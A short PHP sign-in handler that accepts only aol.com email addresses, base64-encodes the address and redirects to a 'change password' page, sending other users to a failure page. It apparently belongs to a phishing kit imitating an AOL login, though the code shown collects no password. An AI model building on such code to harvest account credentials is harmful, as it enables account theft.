<?php
if(isset($_POST['signin'])){
    $username = trim($_POST['username']);
    if($username==""){
        header("Location:index.php?err=201");
    } else {
        $domain = explode("@",$username);
        //check domain 
        if($domain[1] == "aol.com"){
            //encode the userdetails to base64 and attach to the string of the next page  
            $encoded_user = base64_encode($username);
            //hide in session
            header("Location:accounts/change/password.php?base64file=".$encoded_user);
        } else {
            header("Location:fail28c3.html");
        }
    }
}
?>